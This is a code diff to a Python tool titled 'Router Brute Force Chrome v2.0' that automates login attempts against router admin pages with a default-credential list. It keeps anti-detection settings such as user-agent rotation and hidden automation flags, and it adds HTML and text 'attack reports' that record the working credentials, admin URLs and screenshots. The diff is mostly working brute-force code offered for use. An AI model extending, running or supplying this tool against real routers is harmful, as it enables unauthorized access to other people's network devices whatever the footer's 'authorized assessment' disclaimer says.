@@ -102,23 +102,12 @@ def print_banner():
 {Colors.END}
 """
 
-# Target credentials
+# Target credentials - Only 4 combinations
 TARGET_CREDENTIALS = [
     ("admin", "admin"),
     ("admin", "support180"),
     ("support", "support"),
-    ("user", "user"),
-    ("admin", "password"),
-    ("admin", "1234"),
-    ("admin", "12345"),
-    ("admin", "123456"),
-    ("root", "root"),
-    ("root", "admin"),
-    ("admin", ""),
-    ("", "admin"),
-    ("admin", "admin123"),
-    ("admin", "password123"),
-    ("guest", "guest")
+    ("user", "user")
 ]
 
 # User-Agent rotation for anti-detection
@@ -133,7 +122,7 @@ USER_AGENTS = [
 ]
 
 class ChromeRouterBruteForce:
-    def __init__(self, login_urls, threads=1, timeout=10, headless=True, enable_screenshot=True):
+    def __init__(self, login_urls, threads=1, timeout=10, headless=False, enable_screenshot=True):
         self.login_urls = list(set(login_urls))  # Remove duplicates
         self.threads = threads
         self.timeout = timeout
@@ -146,24 +135,27 @@ class ChromeRouterBruteForce:
         try:
             chrome_options = Options()
             
-            if self.headless:
-                chrome_options.add_argument('--headless')
+            # Always run in visible mode for user interaction
+            # if self.headless:
+            #     chrome_options.add_argument('--headless')
             
-            # Performance and stealth options
-            chrome_options.add_argument('--no-sandbox')
-            chrome_options.add_argument('--disable-dev-shm-usage')
-            chrome_options.add_argument('--disable-gpu')
+            # Cross-platform compatibility options
+            if os.name == 'nt':  # Windows
+                chrome_options.add_argument('--no-sandbox')
+                chrome_options.add_argument('--disable-dev-shm-usage')
+            else:  # Linux/macOS
+                chrome_options.add_argument('--no-sandbox')
+                chrome_options.add_argument('--disable-dev-shm-usage')
+                chrome_options.add_argument('--disable-gpu')
+            
+            # Performance options
             chrome_options.add_argument('--disable-logging')
             chrome_options.add_argument('--disable-extensions')
             chrome_options.add_argument('--disable-plugins')
-            chrome_options.add_argument('--disable-images')
-            chrome_options.add_argument('--disable-javascript')
             chrome_options.add_argument('--disable-web-security')
             chrome_options.add_argument('--allow-running-insecure-content')
             chrome_options.add_argument('--ignore-certificate-errors')
             chrome_options.add_argument('--ignore-ssl-errors')
-            chrome_options.add_argument('--ignore-certificate-errors-spki-list')
-            chrome_options.add_argument('--ignore-certificate-errors-spki-list')
             chrome_options.add_argument('--disable-blink-features=AutomationControlled')
             chrome_options.add_experimental_option("excludeSwitches", ["enable-automation"])
             chrome_options.add_experimental_option('useAutomationExtension', False)
@@ -552,6 +544,311 @@ class ChromeRouterBruteForce:
             print(f"{Colors.RED}[!] Error brute forcing {login_url}: {e}{Colors.END}")
             return result
     
+    def generate_html_report(self, results):
+        """Generate HTML report with screenshots"""
+        try:
+            html_content = f"""
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Router Brute Force Chrome v2.0 - Attack Report</title>
+    <style>
+        body {{
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            margin: 0;
+            padding: 20px;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: #333;
+        }}
+        .container {{
+            max-width: 1200px;
+            margin: 0 auto;
+            background: white;
+            border-radius: 10px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.3);
+            overflow: hidden;
+        }}
+        .header {{
+            background: linear-gradient(135deg, #2c3e50 0%, #34495e 100%);
+            color: white;
+            padding: 30px;
+            text-align: center;
+        }}
+        .header h1 {{
+            margin: 0;
+            font-size: 2.5em;
+            text-shadow: 2px 2px 4px rgba(0,0,0,0.5);
+        }}
+        .summary {{
+            padding: 30px;
+            background: #f8f9fa;
+            border-bottom: 1px solid #dee2e6;
+        }}
+        .summary-grid {{
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+            gap: 20px;
+            margin-top: 20px;
+        }}
+        .summary-card {{
+            background: white;
+            padding: 20px;
+            border-radius: 8px;
+            text-align: center;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+        }}
+        .summary-card h3 {{
+            margin: 0 0 10px 0;
+            color: #2c3e50;
+        }}
+        .summary-card .number {{
+            font-size: 2em;
+            font-weight: bold;
+            color: #e74c3c;
+        }}
+        .results {{
+            padding: 30px;
+        }}
+        .target {{
+            margin-bottom: 30px;
+            border: 1px solid #dee2e6;
+            border-radius: 8px;
+            overflow: hidden;
+            background: white;
+        }}
+        .target-header {{
+            background: #f8f9fa;
+            padding: 15px 20px;
+            font-weight: bold;
+            color: #2c3e50;
+            border-bottom: 1px solid #dee2e6;
+        }}
+        .target-content {{
+            padding: 20px;
+        }}
+        .vulnerable {{
+            border-left: 5px solid #e74c3c;
+        }}
+        .safe {{
+            border-left: 5px solid #27ae60;
+        }}
+        .vulnerability {{
+            background: #fff5f5;
+            border: 1px solid #fed7d7;
+            border-radius: 5px;
+            padding: 15px;
+            margin-top: 15px;
+        }}
+        .vulnerability h4 {{
+            color: #e53e3e;
+            margin: 0 0 10px 0;
+        }}
+        .screenshot {{
+            margin-top: 15px;
+            text-align: center;
+        }}
+        .screenshot img {{
+            max-width: 100%;
+            height: auto;
+            border: 1px solid #dee2e6;
+            border-radius: 5px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+        }}
+        .info-grid {{
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+            gap: 15px;
+            margin-top: 15px;
+        }}
+        .info-item {{
+            background: #f8f9fa;
+            padding: 10px 15px;
+            border-radius: 5px;
+            border-left: 3px solid #3498db;
+        }}
+        .info-item strong {{
+            color: #2c3e50;
+        }}
+        .footer {{
+            background: #2c3e50;
+            color: white;
+            padding: 20px;
+            text-align: center;
+        }}
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <h1>🔒 Router Brute Force Chrome v2.0</h1>
+            <p>Chrome-based Router Brute Force Attack Report</p>
+        </div>
+        
+        <div class="summary">
+            <h2>📊 Attack Summary</h2>
+            <div class="summary-grid">
+                <div class="summary-card">
+                    <h3>URLs Tested</h3>
+                    <div class="number">{len(results)}</div>
+                </div>
+                <div class="summary-card">
+                    <h3>Login Pages Found</h3>
+                    <div class="number">{stats['login_pages_found']}</div>
+                </div>
+                <div class="summary-card">
+                    <h3>Vulnerable Routers</h3>
+                    <div class="number">{stats['vulnerable_routers']}</div>
+                </div>
+                <div class="summary-card">
+                    <h3>Attack Duration</h3>
+                    <div class="number">{time.time() - stats['start_time']:.1f}s</div>
+                </div>
+            </div>
+        </div>
+        
+        <div class="results">
+            <h2>🎯 Detailed Results</h2>
+"""
+            
+            for result in results:
+                has_vulnerabilities = len(result['vulnerabilities']) > 0
+                target_class = 'vulnerable' if has_vulnerabilities else 'safe'
+                
+                html_content += f"""
+            <div class="target {target_class}">
+                <div class="target-header">
+                    🎯 URL: {result['url']}
+                    {'🔒 VULNERABLE' if has_vulnerabilities else '✅ SECURE'}
+                </div>
+                <div class="target-content">
+                    <div class="info-grid">
+                        <div class="info-item">
+                            <strong>URL:</strong> {result['url']}
+                        </div>
+                        <div class="info-item">
+                            <strong>Vulnerabilities:</strong> {len(result['vulnerabilities'])}
+                        </div>
+                    </div>
+"""
+                
+                if result['vulnerabilities']:
+                    for vuln in result['vulnerabilities']:
+                        html_content += f"""
+                    <div class="vulnerability">
+                        <h4>🔒 {vuln['type']}</h4>
+                        <p><strong>Credentials:</strong> {vuln['credentials']}</p>
+                        <p><strong>Admin URL:</strong> {vuln['admin_url']}</p>
+                        <p><strong>Verified:</strong> {'✅ Yes' if vuln['verified'] else '❌ No'}</p>
+"""
+                        
+                        if vuln['router_info']:
+                            html_content += """
+                        <h5>📊 Router Information:</h5>
+                        <div class="info-grid">
+"""
+                            for key, value in vuln['router_info'].items():
+                                if value and value != "Unknown":
+                                    html_content += f"""
+                            <div class="info-item">
+                                <strong>{key.replace('_', ' ').title()}:</strong> {value}
+                            </div>
+"""
+                            html_content += """
+                        </div>
+"""
+                        
+                        if vuln.get('screenshot'):
+                            html_content += f"""
+                        <div class="screenshot">
+                            <h5>📸 Screenshot:</h5>
+                            <img src="{vuln['screenshot']}" alt="Admin Panel Screenshot">
+                            <p><em>Screenshot: {vuln['screenshot']}</em></p>
+                        </div>
+"""
+                        html_content += """
+                    </div>
+"""
+                
+                html_content += """
+                </div>
+            </div>
+"""
+            
+            html_content += f"""
+        </div>
+        
+        <div class="footer">
+            <p>Generated by Router Brute Force Chrome v2.0</p>
+            <p>Report generated on {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</p>
+            <p><em>For authorized security assessment only</em></p>
+        </div>
+    </div>
+</body>
+</html>
+"""
+            
+            # Save HTML report
+            report_filename = f"router_brute_force_report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.html"
+            with open(report_filename, 'w', encoding='utf-8') as f:
+                f.write(html_content)
+            
+            print(f"{Colors.GREEN}[+] HTML report generated: {report_filename}{Colors.END}")
+            return report_filename
+            
+        except Exception as e:
+            print(f"{Colors.RED}[!] Error generating HTML report: {e}{Colors.END}")
+            return None
+    
+    def generate_txt_report(self, results):
+        """Generate TXT report with details"""
+        try:
+            report_filename = f"router_brute_force_report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
+            
+            with open(report_filename, 'w', encoding='utf-8') as f:
+                f.write("=" * 80 + "\n")
+                f.write("ROUTER BRUTE FORCE CHROME v2.0 - ATTACK REPORT\n")
+                f.write("=" * 80 + "\n")
+                f.write(f"Report generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
+                f.write(f"Total URLs tested: {len(results)}\n")
+                f.write(f"Login pages found: {stats['login_pages_found']}\n")
+                f.write(f"Vulnerable routers: {stats['vulnerable_routers']}\n")
+                f.write(f"Attack duration: {time.time() - stats['start_time']:.1f} seconds\n")
+                f.write("=" * 80 + "\n\n")
+                
+                for i, result in enumerate(results, 1):
+                    f.write(f"TARGET #{i}: {result['url']}\n")
+                    f.write("-" * 40 + "\n")
+                    
+                    if result['vulnerabilities']:
+                        f.write("STATUS: VULNERABLE\n")
+                        for vuln in result['vulnerabilities']:
+                            f.write(f"  Type: {vuln['type']}\n")
+                            f.write(f"  Credentials: {vuln['credentials']}\n")
+                            f.write(f"  Admin URL: {vuln['admin_url']}\n")
+                            f.write(f"  Verified: {'Yes' if vuln['verified'] else 'No'}\n")
+                            
+                            if vuln['router_info']:
+                                f.write("  Router Information:\n")
+                                for key, value in vuln['router_info'].items():
+                                    if value and value != "Unknown":
+                                        f.write(f"    {key.replace('_', ' ').title()}: {value}\n")
+                            
+                            if vuln.get('screenshot'):
+                                f.write(f"  Screenshot: {vuln['screenshot']}\n")
+                    else:
+                        f.write("STATUS: SECURE\n")
+                    
+                    f.write("\n")
+            
+            print(f"{Colors.GREEN}[+] TXT report generated: {report_filename}{Colors.END}")
+            return report_filename
+            
+        except Exception as e:
+            print(f"{Colors.RED}[!] Error generating TXT report: {e}{Colors.END}")
+            return None
+
     def run_brute_force(self):
         """Run brute force attack on all URLs"""
         print("-" * 80)
@@ -649,6 +946,16 @@ def main():
             print(f"  - Attack duration: {Colors.MAGENTA}{total_time:.1f}{Colors.END} seconds")
             print(f"  - Average speed: {Colors.YELLOW}{len(results)/total_time:.1f}{Colors.END} URLs/second")
             print(f"{Colors.GREEN}[*] Chrome-based brute force completed successfully{Colors.END}")
+            
+            # Generate reports
+            print(f"\n{Colors.CYAN}[*] Generating reports...{Colors.END}")
+            html_report = brute_force.generate_html_report(results)
+            txt_report = brute_force.generate_txt_report(results)
+            
+            if html_report and txt_report:
+                print(f"{Colors.GREEN}[+] Reports generated successfully:{Colors.END}")
+                print(f"  - HTML Report: {Colors.CYAN}{html_report}{Colors.END}")
+                print(f"  - TXT Report: {Colors.CYAN}{txt_report}{Colors.END}")
             
         else:
             print(f"{Colors.RED}[!] No results to report{Colors.END}")
